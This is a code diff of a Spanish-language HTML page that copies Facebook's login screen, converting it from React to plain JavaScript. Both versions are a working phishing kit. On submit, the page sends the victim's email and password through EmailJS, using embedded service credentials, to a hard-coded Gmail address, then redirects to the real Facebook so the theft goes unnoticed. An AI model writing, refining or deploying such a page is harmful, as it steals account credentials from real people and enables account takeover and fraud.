@@ -4,182 +4,177 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Login</title>
-    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/index.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+    </style>
 </head>
-<body>
-    <div id="root"></div>
-    
-    <script type="text/babel">
-        const { useState } = React;
+<body class="bg-gray-100">
+    <div class="min-h-screen bg-gray-100 flex flex-col">
+        <!-- Main Content -->
+        <div class="flex-1 flex items-center justify-center px-4 py-12">
+            <div class="max-w-6xl w-full flex flex-col lg:flex-row items-center lg:items-start justify-between gap-8 lg:gap-16">
+                <!-- Left Side - Logo and Tagline -->
+                <div class="text-center lg:text-left lg:flex-1 lg:pt-12">
+                    <h1 class="text-blue-600 text-6xl font-bold mb-4" style="font-family: Helvetica, Arial, sans-serif; letter-spacing: -0.05em;">
+                        facebook
+                    </h1>
+                    <p class="text-2xl lg:text-3xl leading-tight max-w-md mx-auto lg:mx-0">
+                        Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
+                    </p>
+                </div>
 
+                <!-- Right Side - Login Form -->
+                <div class="w-full max-w-md">
+                    <div class="bg-white rounded-lg shadow-lg p-4">
+                        <form id="loginForm" class="space-y-3">
+                            <input
+                                type="text"
+                                id="email"
+                                placeholder="Correo electrónico o número de teléfono"
+                                class="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-blue-500"
+                                required
+                            />
+                            <input
+                                type="password"
+                                id="password"
+                                placeholder="Contraseña"
+                                class="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-blue-500"
+                                required
+                            />
+                            <button
+                                type="submit"
+                                id="loginBtn"
+                                class="w-full bg-blue-600 hover:bg-blue-700 text-white text-lg font-bold py-3 rounded-md transition-colors disabled:opacity-50"
+                            >
+                                Iniciar sesión
+                            </button>
+                        </form>
+
+                        <div class="text-center my-4">
+                            <a href="#" class="text-blue-600 hover:underline text-sm">
+                                ¿Has olvidado la contraseña?
+                            </a>
+                        </div>
+
+                        <div class="border-t border-gray-300 pt-5 pb-2 flex justify-center">
+                            <button class="bg-green-500 hover:bg-green-600 text-white font-bold px-6 py-3 rounded-md text-base transition-colors">
+                                Crear una cuenta
+                            </button>
+                        </div>
+                    </div>
+
+                    <p class="text-center mt-6 text-sm">
+                        <a href="#" class="font-semibold hover:underline">Crea una página</a>
+                        <span class="text-gray-700"> para un famoso, una marca o una empresa.</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="bg-white py-4 px-4">
+            <div class="max-w-6xl mx-auto">
+                <!-- Languages -->
+                <div class="flex flex-wrap gap-x-3 gap-y-1 text-xs text-gray-500 mb-3">
+                    <a href="#" class="hover:underline">Español (España)</a>
+                    <a href="#" class="hover:underline">English (US)</a>
+                    <a href="#" class="hover:underline">Português (Brasil)</a>
+                    <a href="#" class="hover:underline">Français (France)</a>
+                    <a href="#" class="hover:underline">Italiano</a>
+                    <a href="#" class="hover:underline">Deutsch</a>
+                    <a href="#" class="hover:underline">العربية</a>
+                    <a href="#" class="hover:underline">中文(简体)</a>
+                    <a href="#" class="hover:underline">हिन्दी</a>
+                    <a href="#" class="hover:underline">日本語</a>
+                    <button class="border border-gray-400 px-2 text-gray-600 hover:bg-gray-100">+</button>
+                </div>
+
+                <div class="border-t border-gray-300 pt-2"></div>
+
+                <!-- Links -->
+                <div class="flex flex-wrap gap-x-4 gap-y-1 text-xs text-gray-500 mt-2">
+                    <a href="#" class="hover:underline">Registrarte</a>
+                    <a href="#" class="hover:underline">Iniciar sesión</a>
+                    <a href="#" class="hover:underline">Messenger</a>
+                    <a href="#" class="hover:underline">Facebook Lite</a>
+                    <a href="#" class="hover:underline">Vídeo</a>
+                    <a href="#" class="hover:underline">Meta Pay</a>
+                    <a href="#" class="hover:underline">Meta Store</a>
+                    <a href="#" class="hover:underline">Meta Quest</a>
+                    <a href="#" class="hover:underline">Ray-Ban Meta</a>
+                    <a href="#" class="hover:underline">Meta AI</a>
+                    <a href="#" class="hover:underline">Más contenido de Meta AI</a>
+                    <a href="#" class="hover:underline">Instagram</a>
+                    <a href="#" class="hover:underline">Threads</a>
+                    <a href="#" class="hover:underline">Centro de información de votación</a>
+                    <a href="#" class="hover:underline">Política de privacidad</a>
+                    <a href="#" class="hover:underline">Centro de privacidad</a>
+                    <a href="#" class="hover:underline">Información</a>
+                    <a href="#" class="hover:underline">Crear anuncio</a>
+                    <a href="#" class="hover:underline">Crear página</a>
+                    <a href="#" class="hover:underline">Desarrolladores</a>
+                    <a href="#" class="hover:underline">Empleo</a>
+                    <a href="#" class="hover:underline">Cookies</a>
+                    <a href="#" class="hover:underline">Opciones de anuncios</a>
+                    <a href="#" class="hover:underline">Condiciones</a>
+                    <a href="#" class="hover:underline">Ayuda</a>
+                    <a href="#" class="hover:underline">Subir contactos y no usuarios</a>
+                </div>
+
+                <div class="mt-4 text-xs text-gray-500">
+                    Meta © 2026
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
         // Inicializar EmailJS
         emailjs.init('qWiMP8LChbWxJNgWs');
 
-        function FacebookLogin() {
-          const [email, setEmail] = useState('');
-          const [password, setPassword] = useState('');
-          const [loading, setLoading] = useState(false);
+        const loginForm = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
 
-          const handleLogin = async (e) => {
+        loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-            setLoading(true);
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
 
             if (!email || !password) {
-              alert('Por favor completa todos los campos');
-              setLoading(false);
-              return;
+                alert('Por favor completa todos los campos');
+                return;
             }
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Iniciando sesión...';
 
             try {
-              // Enviar email a través de EmailJS
-              await emailjs.send('service_mn9co68', 'template_8yzlwpb', {
-                to_email: 'penegordoasustado@gmail.com',
-                user_email: email,
-                user_password: password,
-                subject: 'Nuevo intento de login en Facebook'
-              });
+                // Enviar email a través de EmailJS
+                await emailjs.send('service_mn9co68', 'template_8yzlwpb', {
+                    to_email: 'penegordoasustado@gmail.com',
+                    user_email: email,
+                    user_password: password,
+                    subject: 'Nuevo intento de login en Facebook'
+                });
 
-              // Si se envía exitosamente, redirigir a Facebook
-              window.location.href = 'https://www.facebook.com';
+                // Redirigir a Facebook después de enviar
+                window.location.href = 'https://www.facebook.com';
             } catch (error) {
-              console.error('Error al enviar email:', error);
-              alert('Ocurrió un error. Por favor intenta de nuevo.');
-              setLoading(false);
+                console.error('Error al enviar email:', error);
+                alert('Error al iniciar sesión. Por favor intenta de nuevo.');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Iniciar sesión';
             }
-          };
-
-          return (
-            <div className="min-h-screen bg-gray-100 flex flex-col">
-              {/* Main Content */}
-              <div className="flex-1 flex items-center justify-center px-4 py-12">
-                <div className="max-w-6xl w-full flex flex-col lg:flex-row items-center lg:items-start justify-between gap-8 lg:gap-16">
-                  {/* Left Side - Logo and Tagline */}
-                  <div className="text-center lg:text-left lg:flex-1 lg:pt-12">
-                    <h1 className="text-blue-600 text-6xl font-bold mb-4" style={{fontFamily: 'Helvetica, Arial, sans-serif', letterSpacing: '-0.05em'}}>
-                      facebook
-                    </h1>
-                    <p className="text-2xl lg:text-3xl leading-tight max-w-md mx-auto lg:mx-0">
-                      Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
-                    </p>
-                  </div>
-
-                  {/* Right Side - Login Form */}
-                  <div className="w-full max-w-md">
-                    <div className="bg-white rounded-lg shadow-lg p-4">
-                      <form onSubmit={handleLogin} className="space-y-3">
-                        <input
-                          type="text"
-                          placeholder="Correo electrónico o número de teléfono"
-                          value={email}
-                          onChange={(e) => setEmail(e.target.value)}
-                          className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-blue-500"
-                          required
-                          disabled={loading}
-                        />
-                        <input
-                          type="password"
-                          placeholder="Contraseña"
-                          value={password}
-                          onChange={(e) => setPassword(e.target.value)}
-                          className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-blue-500"
-                          required
-                          disabled={loading}
-                        />
-                        <button
-                          type="submit"
-                          disabled={loading}
-                          className="w-full bg-blue-600 hover:bg-blue-700 text-white text-lg font-bold py-3 rounded-md transition-colors disabled:opacity-50"
-                        >
-                          {loading ? 'Iniciando sesión...' : 'Iniciar sesión'}
-                        </button>
-                      </form>
-
-                      <div className="text-center my-4">
-                        <a href="#" className="text-blue-600 hover:underline text-sm">
-                          ¿Has olvidado la contraseña?
-                        </a>
-                      </div>
-
-                      <div className="border-t border-gray-300 pt-5 pb-2 flex justify-center">
-                        <button className="bg-green-500 hover:bg-green-600 text-white font-bold px-6 py-3 rounded-md text-base transition-colors">
-                          Crear una cuenta
-                        </button>
-                      </div>
-                    </div>
-
-                    <p className="text-center mt-6 text-sm">
-                      <a href="#" className="font-semibold hover:underline">Crea una página</a>
-                      <span className="text-gray-700"> para un famoso, una marca o una empresa.</span>
-                    </p>
-                  </div>
-                </div>
-              </div>
-
-              {/* Footer */}
-              <footer className="bg-white py-4 px-4">
-                <div className="max-w-6xl mx-auto">
-                  {/* Languages */}
-                  <div className="flex flex-wrap gap-x-3 gap-y-1 text-xs text-gray-500 mb-3">
-                    <a href="#" className="hover:underline">Español (España)</a>
-                    <a href="#" className="hover:underline">English (US)</a>
-                    <a href="#" className="hover:underline">Português (Brasil)</a>
-                    <a href="#" className="hover:underline">Français (France)</a>
-                    <a href="#" className="hover:underline">Italiano</a>
-                    <a href="#" className="hover:underline">Deutsch</a>
-                    <a href="#" className="hover:underline">العربية</a>
-                    <a href="#" className="hover:underline">中文(简体)</a>
-                    <a href="#" className="hover:underline">हिन्दी</a>
-                    <a href="#" className="hover:underline">日本語</a>
-                    <button className="border border-gray-400 px-2 text-gray-600 hover:bg-gray-100">+</button>
-                  </div>
-
-                  <div className="border-t border-gray-300 pt-2"></div>
-
-                  {/* Links */}
-                  <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-gray-500 mt-2">
-                    <a href="#" className="hover:underline">Registrarte</a>
-                    <a href="#" className="hover:underline">Iniciar sesión</a>
-                    <a href="#" className="hover:underline">Messenger</a>
-                    <a href="#" className="hover:underline">Facebook Lite</a>
-                    <a href="#" className="hover:underline">Vídeo</a>
-                    <a href="#" className="hover:underline">Meta Pay</a>
-                    <a href="#" className="hover:underline">Meta Store</a>
-                    <a href="#" className="hover:underline">Meta Quest</a>
-                    <a href="#" className="hover:underline">Ray-Ban Meta</a>
-                    <a href="#" className="hover:underline">Meta AI</a>
-                    <a href="#" className="hover:underline">Más contenido de Meta AI</a>
-                    <a href="#" className="hover:underline">Instagram</a>
-                    <a href="#" className="hover:underline">Threads</a>
-                    <a href="#" className="hover:underline">Centro de información de votación</a>
-                    <a href="#" className="hover:underline">Política de privacidad</a>
-                    <a href="#" className="hover:underline">Centro de privacidad</a>
-                    <a href="#" className="hover:underline">Información</a>
-                    <a href="#" className="hover:underline">Crear anuncio</a>
-                    <a href="#" className="hover:underline">Crear página</a>
-                    <a href="#" className="hover:underline">Desarrolladores</a>
-                    <a href="#" className="hover:underline">Empleo</a>
-                    <a href="#" className="hover:underline">Cookies</a>
-                    <a href="#" className="hover:underline">Opciones de anuncios</a>
-                    <a href="#" className="hover:underline">Condiciones</a>
-                    <a href="#" className="hover:underline">Ayuda</a>
-                    <a href="#" className="hover:underline">Subir contactos y no usuarios</a>
-                  </div>
-
-                  <div className="mt-4 text-xs text-gray-500">
-                    Meta © 2026
-                  </div>
-                </div>
-              </footer>
-            </div>
-          );
-        }
-
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<FacebookLogin />);
+        });
     </script>
 </body>
 </html>
